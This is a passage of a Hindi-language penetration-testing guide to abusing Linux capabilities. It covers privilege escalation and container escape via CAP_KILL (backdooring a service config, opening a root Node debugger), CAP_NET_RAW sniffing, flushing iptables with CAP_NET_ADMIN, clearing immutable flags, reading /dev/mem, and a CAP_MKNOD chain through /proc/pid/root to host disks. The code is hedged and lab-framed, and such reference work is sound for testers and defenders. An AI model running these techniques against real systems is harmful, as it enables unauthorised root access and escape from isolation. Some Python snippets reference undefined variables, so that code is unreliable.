0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

यह capability file capabilities लिखने की अनुमति देती है, लेकिन यह अपने आप में वर्तमान process को वे capabilities नहीं देती और न ही file, bounding-set तथा namespace के उन नियमों को bypass करती है जो file execute होने पर लागू होते हैं।<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

फ़ाइल की permitted capabilities, process के capability bounding set से सीमित होती हैं, और फ़ाइल का effective bit यह नियंत्रित करता है कि फ़ाइल का permitted set, process के effective set में जोड़ा जाए या नहीं। इसी वजह से, किसी फ़ाइल में capabilities जोड़ने से execution के समय अनुरोधित हर capability अपने-आप उपयोग योग्य नहीं हो जाती।<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) कई संवेदनशील operations की सुविधा देता है, जिनमें `/dev/mem`, `/dev/kmem` या `/proc/kcore` तक पहुँच, `mmap_min_addr` में बदलाव, `ioperm(2)` और `iopl(2)` system calls तक पहुँच, और विभिन्न disk commands शामिल हैं। इस capability के ज़रिए `FIBMAP ioctl(2)` भी सक्षम होता है, जिससे [अतीत में](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) समस्याएँ पैदा हुई हैं। man page के अनुसार, यह capability रखने वाले को अन्य devices पर device-specific operations की एक श्रृंखला करने की भी अनुमति देता है।<sup>[[14]](#references)</sup>

यह **privilege escalation** और **Docker breakout** के लिए उपयोगी हो सकता है।<sup>[[14]](#references)</sup>

यह capability अकेले कोई उपयोगी interface उपलब्ध नहीं कराती। Container breakout के लिए इसके अतिरिक्त किसी accessible host device या resource, device-cgroup और filesystem permissions, तथा hardware और kernel के अनुरूप किसी technique की आवश्यकता होती है। सख्त `/dev/mem` नीतियाँ, kernel lockdown, virtualization, seccomp और LSM नीतियाँ आम तौर पर generic paths को हटा देती हैं। पहले capability और exposure की पुष्टि करें:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

यदि `/dev/mem` स्वीकृत इंटरफ़ेस है, तो एक डिस्पोज़ेबल लैब उस लैब के hardware map से चुनी गई रेंज को पढ़कर और उसका hash बनाकर सीमाओं के पार node-memory disclosure प्रदर्शित कर सकती है:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

रेंज का अनुमान न लगाएँ: कुछ MMIO regions को पढ़ने से side effects हो सकते हैं, और एक platform पर मान्य address दूसरे platform पर hardware या kernel memory को नियंत्रित कर सकता है। Kernel memory में बदलाव या device control के लिए स्वीकृत, platform-specific proof आवश्यक है; raw-write का कोई सुरक्षित सार्वभौमिक उदाहरण नहीं है।

## CAP_KILL

**यह capability, kernel द्वारा निर्धारित मामलों में processes को signals भेजने की permission checks को bypass करती है**.<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

मान लें कि **`python`** binary में यह capability है। यदि आप **किसी service या socket configuration** (या service से संबंधित किसी configuration file) को भी modify कर सकते हैं, तो आप उसमें backdoor डाल सकते हैं। फिर उस service से संबंधित process को kill करके, नई configuration file के आपके backdoor के साथ execute होने का इंतज़ार कर सकते हैं।

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

अगर आपके पास kill capabilities हैं और **root के रूप में चल रहा node program** (या किसी दूसरे user के रूप में) मौजूद है, तो आप शायद उसे **signal SIGUSR1 भेज** सकते हैं, जिससे वह **node debugger खोल दे**, और फिर आप उससे connect कर सकें।

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**यह capability 1024 से नीचे के Internet ports से bind करने की अनुमति देती है।** यह सीधे तौर पर privilege escalation के व्यापक अधिकार नहीं देती।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

अगर **`python`** के पास यह capability है, तो यह किसी भी port पर listen कर सकेगा और वहाँ से किसी भी दूसरे port से connect भी कर सकेगा (कुछ services के लिए specific privileged ports से connections ज़रूरी होते हैं)

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) प्रक्रियाओं को **RAW और PACKET sockets बनाने** की अनुमति देता है, जिससे वे मनमाने network packets बना और भेज सकती हैं। इससे containerized environments में packet spoofing, traffic injection और network access controls को bypass करने जैसे सुरक्षा जोखिम पैदा हो सकते हैं। दुर्भावनापूर्ण लोग इसका दुरुपयोग करके container routing में बाधा डाल सकते हैं या host network security से समझौता कर सकते हैं, खासकर जब पर्याप्त firewall सुरक्षा न हो। इसके अलावा, **CAP_NET_RAW** RAW ICMP requests के ज़रिए ping करने जैसी गतिविधियों को भी सक्षम करता है।<sup>[[14]](#references)</sup>

**उपयुक्त socket interface के साथ इससे packet capture संभव हो सकता है।** यह सीधे तौर पर व्यापक privilege escalation की अनुमति नहीं देता।<sup>[[14]](#references)</sup>

Credentials उजागर होने का रास्ता जांचने के लिए यह भी पुष्टि करें कि मौजूदा account effective capabilities वाले capture tool को चला सकता है, संबंधित traffic उसके network namespace में दिखने वाले interface से होकर गुजरता है, और authentication material plaintext में भेजा जाता है। उदाहरण के लिए, अगर capture tool उस interface तक पहुंच सकता है, तो unencrypted HTTP पर भेजे गए HTTP Basic credentials loopback पर देखे जा सकते हैं। किसी दूसरे account में जाने के लिए यह भी ज़रूरी है कि पकड़ा गया credential उस दूसरी identity के लिए काम करे; केवल file capability या login request दिखना password reuse साबित नहीं करता।

Wireless host पर, effective `CAP_NET_RAW` वाला `reaver` जैसा executable WPS audit tool, और `iw dev` के ज़रिए दिखने वाला AP तथा monitor-mode interface—ये जांच के लिए एक और संकेत हैं। यह **उपयोगी privilege escalation का प्रमाण नहीं** है: AP को ऐसा WPS PIN authentication उपलब्ध कराना होगा जिस पर प्रभावी lockout न हो, wireless interface से पहुंच योग्य होना होगा, और PSK उजागर करना होगा; host पर privilege तभी बदलेगा जब वह PSK किसी account के लिए दोबारा इस्तेमाल किया गया हो। Passive enumeration में interface modes और capabilities की जानकारी दें, probes न भेजें और PIN आज़माएं नहीं। WPS PIN की कमजोरी के लिए [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) और tool के व्यवहार के लिए [Reaver की project documentation](https://github.com/shift/reaver-wps) देखें।

**Binary के साथ उदाहरण**

अगर binary **`tcpdump`** में यह capability है, तो आप इसका इस्तेमाल network information capture करने के लिए कर सकते हैं।

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

यदि **environment** यह capability देता है, तो **`tcpdump`** इसका उपयोग traffic sniff करने के लिए भी कर सकता है।<sup>[[14]](#references)</sup>

**binary 2 के साथ उदाहरण**

निम्न उदाहरण **`python2`** code है, जो "**lo**" (**localhost**) interface के traffic को intercept करने में उपयोगी हो सकता है। यह code [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) के lab "_The Basics: CAP-NET_BIND + NET_RAW_" से लिया गया है।<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) धारक को मौजूदा network namespace में **network configurations बदलने** की शक्ति देता है, जिसमें firewall settings, routing tables, socket permissions और network interface settings शामिल हैं। यह उस namespace में किसी interface पर promiscuous mode भी सक्षम कर सकता है; इससे उस interface तक पहुँचने वाला traffic उजागर हो सकता है, लेकिन इससे अपने-आप दूसरे network namespaces में मौजूद मनमाने interfaces को sniff करने की अनुमति नहीं मिलती।<sup>[[14]](#references)</sup>

ये operations process के **मौजूदा network namespace** को प्रभावित करते हैं। Host के network state पर नियंत्रण के लिए `--network=host`, Kubernetes में `hostNetwork: true`, या namespace में प्रवेश करने के लिए अलग primitive की आवश्यकता होती है। `CAP_NET_RAW` अकेले कोई generic host shell नहीं है, लेकिन यह एक documented, protocol-specific escape में शामिल रहा है: एक ऐतिहासिक GCE chain में root, host network namespace, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext metadata traffic और SSH key inject करने के लिए raceable guest-agent request का संयोजन था। पूरी prerequisites और modern HTTPS metadata caveats के लिए [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) देखें।

**binary के साथ उदाहरण**

मान लें कि **python binary** में ये capabilities हैं।

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**यह capability immutable और append-only जैसे inode flags को संशोधित करने की अनुमति देती है। यह सीधे तौर पर व्यापक privilege escalation की अनुमति नहीं देती।**<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

यदि आपको पता चलता है कि कोई file immutable है और python के पास यह capability है, तो आप **immutable attribute हटा सकते हैं और file को संशोधित करने योग्य बना सकते हैं:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

`FS_IOC_GETFLAGS` और `FS_IOC_SETFLAGS` operations inode flags को पढ़ते और अपडेट करते हैं; `FS_IMMUTABLE_FL` immutable flag है, जिसे यह उदाहरण clear करता है।<sup>[[27]](#references)</sup>

> [!TIP]
> ध्यान दें कि आमतौर पर यह immutable attribute इस तरह set और remove किया जाता है:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `chroot(2)` system call चलाने की अनुमति देता है। इससे ज्ञात तकनीकों के ज़रिए कमज़ोर तरीके से बनाए गए `chroot(2)` jail से बाहर निकला जा सकता है।<sup>[[11]](#references)[[14]](#references)</sup>

यह **chroot-jail से बाहर निकलने की क्षमता है, अपने-आप में container से host में escape करने की क्षमता नहीं**। यह न तो host filesystem को उजागर करता है और न ही उसकी permissions को bypass करता है। यदि host root पहले से mounted है या `/proc/<pid>/root` के ज़रिए पहुँच योग्य है, तो `chroot()` केवल उस मौजूदा tree को process का pathname root बनाता है। अलग से, `setns(2)` के ज़रिए mount namespaces बदलने के लिए caller के user namespace में `CAP_SYS_CHROOT` और `CAP_SYS_ADMIN` दोनों, और target mount namespace के मालिक user namespace में `CAP_SYS_ADMIN` आवश्यक हैं।<sup>[[14]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) system restart के लिए `reboot(2)` system call चलाने की अनुमति देता है, जिसमें `LINUX_REBOOT_CMD_RESTART2` जैसे commands शामिल हैं। यह नए या signed crash kernels लोड करने के लिए `kexec_load(2)` और Linux 3.17 से `kexec_file_load(2)` को भी सक्षम करता है।<sup>[[14]](#references)</sup>

एक private PID namespace के भीतर, समर्थित `reboot()` request host को reboot करने के बजाय उस namespace की init process को terminate करती है। इसलिए host को reboot करने के लिए initial PID namespace आवश्यक है, जो सामान्यतः host PID sharing के ज़रिए उपलब्ध होता है। kexec-आधारित takeover के लिए इसके अतिरिक्त compatible image, उपलब्ध syscall, और permissive lockdown तथा signature policy आवश्यक हैं। केवल इस capability को validate करने के लिए shared host पर इनमें से कोई operation न चलाएँ:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) को Linux 2.6.37 में व्यापक **CAP_SYS_ADMIN** से अलग किया गया था, ताकि विशेष रूप से `syslog(2)` call का उपयोग करने की क्षमता दी जा सके। यह capability, `kptr_restrict` setting 1 पर होने पर, `/proc` और ऐसे ही interfaces के ज़रिए kernel addresses देखने की सुविधा देती है। यह setting kernel addresses के exposure को नियंत्रित करती है। Linux 2.6.39 से `kptr_restrict` का default 0 है, जिसका अर्थ है कि kernel addresses expose होते हैं। हालांकि, सुरक्षा कारणों से कई distributions इसे 1 (uid 0 को छोड़कर addresses छिपाएँ) या 2 (हमेशा addresses छिपाएँ) पर सेट करती हैं।<sup>[[14]](#references)</sup>

इसके अलावा, `dmesg_restrict` के 1 पर सेट होने पर **CAP_SYSLOG** `dmesg` output तक पहुँचने की अनुमति देता है। इन बदलावों के बावजूद, ऐतिहासिक कारणों से **CAP_SYS_ADMIN** में `syslog` operations करने की क्षमता बनी रहती है।<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `mknod` system call की functionality को regular files, FIFOs (named pipes) या UNIX domain sockets बनाने से आगे बढ़ाता है। यह विशेष रूप से special files बनाने की अनुमति देता है, जिनमें शामिल हैं:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character special files, जैसे terminals वाले devices।
- **S_IFBLK**: Block special files, जैसे disks वाले devices।

यह capability उन processes के लिए उपयोगी है जिन्हें device files बनाने की ज़रूरत होती है, जिनमें character या block devices शामिल हैं।<sup>[[14]](#references)</sup>

यह Docker के documented default capability set में शामिल है; यह मानने के बजाय कि हर deployment में एक जैसे defaults हैं, वास्तविक runtime configuration जाँचें ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))।<sup>[[19]](#references)</sup>

Container escape के लिए, `CAP_MKNOD` किसी वास्तविक host device का अनुपस्थित handle बना सकता है, लेकिन यह **न तो** underlying device बनाता है **और न ही** device cgroup को bypass करता है। पूरी प्रक्रिया के लिए ज़रूरी है:

1. Initial user namespace में Effective `CAP_MKNOD`, क्योंकि device creation namespaced नहीं है।
2. वास्तविक host device के लिए सही block या character type और major/minor numbers।
3. उस device को open करने की device-cgroup permission।
4. Filesystem को समझने वाला compatible reader, या block filesystem mount करने के लिए `CAP_SYS_ADMIN`।
5. Node बनाने और इस्तेमाल करने की filesystem और LSM permission।

ऐसे ext-family lab block device के लिए जिसके वास्तविक major/minor numbers `252:1` हैं, read-only validation यह है:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

`/sys/class/block/<device>/dev` द्वारा रिपोर्ट किए गए नंबरों से नंबर बदलें। यदि node बन जाता है, लेकिन उसे खोलने पर `Operation not permitted` मिलता है, तो device cgroup अब भी access को रोक रहा है। यह उस container में सामान्य परिणाम है जिसमें Docker का default `CAP_MKNOD` तो है, लेकिन किसी device की explicit अनुमति नहीं है।

एक अलग **two-foothold local privilege-escalation** technique भी है, जिसे direct container device access से भ्रमित नहीं करना चाहिए। उस container में चल रही root process, जो initial user namespace साझा करती है, block-device node बना सकती है। वहीं, host पर matching UID वाला unprivileged shell उस node को `/proc/<container-pid>/root` के ज़रिए खोलता है। इसके बाद open का मूल्यांकन host shell के cgroup में होता है, इसलिए container का device-cgroup denial अब device को सुरक्षित नहीं रखता।<sup>[[7]](#references)</sup>

Container के अंदर node बनाएँ और मौजूदा host foothold के UID के रूप में चल रही एक process को चालू रखें:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

मौजूदा host shell से, उस UID के साथ, sleeping container process का host PID पहचानें और डिवाइस के path के रूप में उसके procfs root का उपयोग करें:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

इस chain के लिए दोनों footholds, identity-mapped या shared user namespace, target `/proc/<pid>/root` को traverse करने की permission, सही major/minor numbers वाला वास्तविक device, और open की अनुमति देने वाला outer cgroup—इन सभी की आवश्यकता होती है। `hidepid`, ptrace-access rules, LSM, filesystem incompatibility या user-namespace remapping इसे विफल कर सकते हैं। यह ऐतिहासिक technique इसलिए उपयोगी है क्योंकि यह बताती है कि `/proc/<pid>/root`, *container* के device-cgroup restriction को कैसे bypass कर सकता है; इसका यह दावा नहीं है कि `CAP_MKNOD` अकेले किसी सामान्य रूप से isolated container से बाहर निकलने के लिए पर्याप्त है।<sup>[[7]](#references)</sup>

### CAP_SETPCAP

File capabilities वाले मौजूदा Linux kernels में, **`CAP_SETPCAP`** किसी thread को अपने bounding set की capabilities को inheritable set में जोड़ने, अपने bounding set से capabilities हटाने और अपने securebits बदलने की अनुमति देता है। इससे कोई process मनमाने ढंग से किसी दूसरे process को capabilities नहीं दे सकता; यह व्यवहार केवल file-capability support के बिना वाले 2.6.25 से पहले के kernels पर लागू होता है।<sup>[[14]](#references)</sup>

`capset()` system call किसी thread के अपने effective, permitted और inheritable sets को समायोजित कर सकती है, लेकिन नए permitted set में मौजूदा permitted set से बाहर की capabilities नहीं हो सकतीं, और inheritable set में किए गए बदलाव kernel की पाबंदियों के अधीन रहते हैं।<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation की labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux में privilege escalation](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container के मूल सिद्धांत: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Linux Capabilities का लाभ उठाना](https://www.linuxjournal.com/article/5737)
- [6] [अत्यधिक Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [/proc/pid/root के ज़रिए mount namespaces तक access का दुरुपयोग](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: वे क्यों मौजूद हैं और कैसे काम करती हैं](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Linux में Capabilities को समझना](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [ptrace की अनुमति होने पर seccomp को bypass करने का PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [विभिन्न chroot समाधानों से बाहर निकलने का तरीका](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Sebastian Krahmer का मूल CAP_DAC_READ_SEARCH Docker breakout exploit](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit का विश्लेषण](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu मैनपेज](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Containers चलाना - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
